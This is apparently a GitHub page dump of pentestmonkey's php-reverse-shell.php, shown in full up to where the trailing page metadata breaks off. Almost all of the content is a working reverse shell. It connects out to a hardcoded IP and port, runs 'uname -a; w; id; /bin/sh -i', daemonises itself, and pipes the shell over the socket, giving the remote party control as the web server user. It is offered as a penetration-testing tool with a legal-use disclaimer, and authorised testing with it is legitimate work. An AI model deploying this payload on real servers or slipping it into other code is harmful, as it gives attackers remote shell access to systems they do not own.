{"payload":{"allShortcutsEnabled":false,"fileTree":{"":{"items":[{"name":"CHANGELOG","path":"CHANGELOG","contentType":"file"},{"name":"COPYING.GPL","path":"COPYING.GPL","contentType":"file"},{"name":"COPYING.PHP-REVERSE-SHELL","path":"COPYING.PHP-REVERSE-SHELL","contentType":"file"},{"name":"LICENSE","path":"LICENSE","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"php-reverse-shell.php","path":"php-reverse-shell.php","contentType":"file"}],"totalCount":6}},"fileTreeProcessingTime":2.635658,"foldersToFetch":[],"reducedMotionEnabled":null,"repo":{"id":36526302,"defaultBranch":"master","name":"php-reverse-shell","ownerLogin":"pentestmonkey","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2015-05-29T20:04:12.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/738309?v=4","public":true,"private":false,"isOrgOwned":false},"symbolsExpanded":false,"treeExpanded":true,"refInfo":{"name":"master","listCacheKey":"v0:1432929853.0","canEdit":false,"refType":"branch","currentOid":"8aa37ebe03d896b432c4b4469028e2bed75785f1"},"path":"php-reverse-shell.php","currentUser":null,"blob":{"rawLines":["<?php","// php-reverse-shell - A Reverse Shell implementation in PHP","// Copyright (C) 2007 pentestmonkey@pentestmonkey.net","//","// This tool may be used for legal purposes only.  Users take full responsibility","// for any actions performed using this tool.  The author accepts no liability","// for damage caused by this tool.  If these terms are not acceptable to you, then","// do not use this tool.","//","// In all other respects the GPL version 2 applies:","//","// This program is free software; you can redistribute it and/or modify","// it under the terms of the GNU General Public License version 2 as","// published by the Free Software Foundation.","//","// This program is distributed in the hope that it will be useful,","// but WITHOUT ANY WARRANTY; without even the implied warranty of","// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the","// GNU General Public License for more details.","//","// You should have received a copy of the GNU General Public License along","// with this program; if not, write to the Free Software Foundation, Inc.,","// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.","//","// This tool may be used for legal purposes only.  Users take full responsibility","// for any actions performed using this tool.  If these terms are not acceptable to","// you, then do not use this tool.","//","// You are encouraged to send comments, improvements or suggestions to","// me at pentestmonkey@pentestmonkey.net","//","// Description","// -----------","// This script will make an outbound TCP connection to a hardcoded IP and port.","// The recipient will be given a shell running as the current user (apache normally).","//","// Limitations","// -----------","// proc_open and stream_set_blocking require PHP version 4.3+, or 5+","// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.","// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.","//","// Usage","// -----","// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.","","set_time_limit (0);","$VERSION = \"1.0\";","$ip = '127.0.0.1';  // CHANGE THIS","$port = 1234;       // CHANGE THIS","$chunk_size = 1400;","$write_a = null;","$error_a = null;","$shell = 'uname -a; w; id; /bin/sh -i';","$daemon = 0;","$debug = 0;","","//","// Daemonise ourself if possible to avoid zombies later","//","","// pcntl_fork is hardly ever available, but will allow us to daemonise","// our php process and avoid zombies.  Worth a try...","if (function_exists('pcntl_fork')) {","\t// Fork and have the parent process exit","\t$pid = pcntl_fork();","\t","\tif ($pid == -1) {","\t\tprintit(\"ERROR: Can't fork\");","\t\texit(1);","\t}","\t","\tif ($pid) {","\t\texit(0);  // Parent exits","\t}","","\t// Make the current process a session leader","\t// Will only succeed if we forked","\tif (posix_setsid() == -1) {","\t\tprintit(\"Error: Can't setsid()\");","\t\texit(1);","\t}","","\t$daemon = 1;","} else {","\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");","}","","// Change to a safe directory","chdir(\"/\");","","// Remove any umask we inherited","umask(0);","","//","// Do the reverse shell...","//","","// Open reverse connection","$sock = fsockopen($ip, $port, $errno, $errstr, 30);","if (!$sock) {","\tprintit(\"$errstr ($errno)\");","\texit(1);","}","","// Spawn shell process","$descriptorspec = array(","   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from","   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to","   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to",");","","$process = proc_open($shell, $descriptorspec, $pipes);","","if (!is_resource($process)) {","\tprintit(\"ERROR: Can't spawn shell\");","\texit(1);","}","","// Set everything to non-blocking","// Reason: Occsionally reads will block, even though stream_select tells us they won't","stream_set_blocking($pipes[0], 0);","stream_set_blocking($pipes[1], 0);","stream_set_blocking($pipes[2], 0);","stream_set_blocking($sock, 0);","","printit(\"Successfully opened reverse shell to $ip:$port\");","","while (1) {","\t// Check for end of TCP connection","\tif (feof($sock)) {","\t\tprintit(\"ERROR: Shell connection terminated\");","\t\tbreak;","\t}","","\t// Check for end of STDOUT","\tif (feof($pipes[1])) {","\t\tprintit(\"ERROR: Shell process terminated\");","\t\tbreak;","\t}","","\t// Wait until a command is end down $sock, or some","\t// command output is available on STDOUT or STDERR","\t$read_a = array($sock, $pipes[1], $pipes[2]);","\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);","","\t// If we can read from the TCP socket, send","\t// data to process's STDIN","\tif (in_array($sock, $read_a)) {","\t\tif ($debug) printit(\"SOCK READ\");","\t\t$input = fread($sock, $chunk_size);","\t\tif ($debug) printit(\"SOCK: $input\");","\t\tfwrite($pipes[0], $input);","\t}","","\t// If we can read from the process's STDOUT","\t// send data down tcp connection","\tif (in_array($pipes[1], $read_a)) {","\t\tif ($debug) printit(\"STDOUT READ\");","\t\t$input = fread($pipes[1], $chunk_size);","\t\tif ($debug) printit(\"STDOUT: $input\");","\t\tfwrite($sock, $input);","\t}","","\t// If we can read from the process's STDERR","\t// send data down tcp connection","\tif (in_array($pipes[2], $read_a)) {","\t\tif ($debug) printit(\"STDERR READ\");","\t\t$input = fread($pipes[2], $chunk_size);","\t\tif ($debug) printit(\"STDERR: $input\");","\t\tfwrite($sock, $input);","\t}","}","","fclose($sock);","fclose($pipes[0]);","fclose($pipes[1]);","fclose($pipes[2]);","proc_close($process);","","// Like print, but does nothing if we've daemonised ourself","// (I can't figure out how to redirect STDOUT like a proper daemon)","function printit ($string) {","\tif (!$daemon) {","\t\tprint \"$string\\n\";","\t}","}","","?> "],"stylingDirectives":[[{"start":0,"end":5,"cssClass":"pl-ent"}],[{"start":0,"end":60,"cssClass":"pl-c"}],[{"start":0,"end":53,"cssClass":"pl-c"}],[{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":81,"cssClass":"pl-c"}],[{"start":0,"end":78,"cssClass":"pl-c"}],[{"start":0,"end":82,"cssClass":"pl-c"}],[{"start":0,"end":24,"cssClass":"pl-c"}],[{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":51,"cssClass":"pl-c"}],[{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":71,"cssClass":"pl-c"}],[{"start":0,"end":68,"cssClass":"pl-c"}],[{"start":0,"end":45,"cssClass":"pl-c"}],[{"start":0,"end":2,"cssClass":"pl-c"}],[{"start":0,"end":66,"cssClass":"pl-c"}],[{"start":0,"end":65,"cssClass":"pl-c"}],[{"start":0,"end":64,"cssClass":"pl-c"}],[{"start":0,"end":47,"cssClass":"pl-c"}],[{"start":0,"end":2,"cssClass":"p